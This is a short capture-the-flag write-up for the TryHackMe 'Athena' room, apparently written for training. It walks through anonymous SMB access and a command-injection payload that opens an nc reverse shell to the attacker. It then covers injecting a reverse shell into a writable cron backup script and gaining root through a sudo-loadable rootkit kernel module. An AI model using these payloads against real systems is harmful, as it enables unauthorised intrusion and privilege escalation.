# Athena - TryHackMe 

![](https://tryhackme-images.s3.amazonaws.com/room-icons/53d3c28c1af197142685ceb238d5ce3c.png)

## Nmap Scan

```bash
PORT    STATE SERVICE      REASON
22/tcp  open  ssh          syn-ack ttl 63 
80/tcp  open  http         syn-ack ttl 63 
139/tcp open  netbios-ssn  syn-ack ttl 63 
445/tcp open  microsoft-ds syn-ack ttl 63 
``` 

## Web Pwn

* On port 80 => there is a web page. 

* SMB has anonymous login there will be a file containg a hidden direcotory in the web page. `/myrouterpanel`

```bash
> smbclient \\\\$VMIP\\public 
Password for [WORKGROUP\trevohack]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Apr 17 06:24:43 2023
  ..                                  D        0  Mon Apr 17 06:24:05 2023
  msg_for_administrator.txt           N      253  Mon Apr 17 00:29:44 2023

		19947120 blocks of size 1024. 9693196 blocks available
smb: \> get msg_for_administrator.txt
getting file \msg_for_administrator.txt of size 253 as msg_for_administrator.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \>
``` 

* `/myrouterpanel` is vulnerable to RCE `$(nc <lhost> <lport> -e /bin/bash)` will get a reverse shell as `www-data`

## Priv Escalate to Athena

* From there, a `backup.sh` file is available at `/usr/share/backup` which runs recursively if you look at `pspy`.

* `ls -la` shows this

```bash
-rwxr-xr-x   1 www-data athena     310 Sep 16 19:01 backup.sh
``` 

* Injecting a reverse shell may give a shell as `athena`

```bash
> nc -nvlp 9090
Listening on 0.0.0.0 9090
Connection received on 10.10.236.162 41090 
bash: no job control in this shell
athena@routerpanel:/$ whoami
athena
```

## Priv Escalate to root

* On athena `sudo -l -l` reveals that `/mnt/.../secret/venom.ko` can be loaded to the kernel


```bash
athena@routerpanel:/$ sudo -l -l
Matching Defaults entries for athena on routerpanel:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User athena may run the following commands on routerpanel:
Sudoers entry:
    RunAsUsers: root
    Options: !authenticate
    Commands:
	/usr/sbin/insmod /mnt/.../secret/venom.ko
``` 

* USE Ghidra: to reverse the venom.ko file 

![](https://i.postimg.cc/RFR6NDRs/reverse.png)

![](https://i.postimg.cc/qRjqkCJW/reversing.png)

* After reversing, the `give_root` function may work like this `kill -57 <pid>`, later on the `id` command reveals that you have root access.

# Thank You!! 
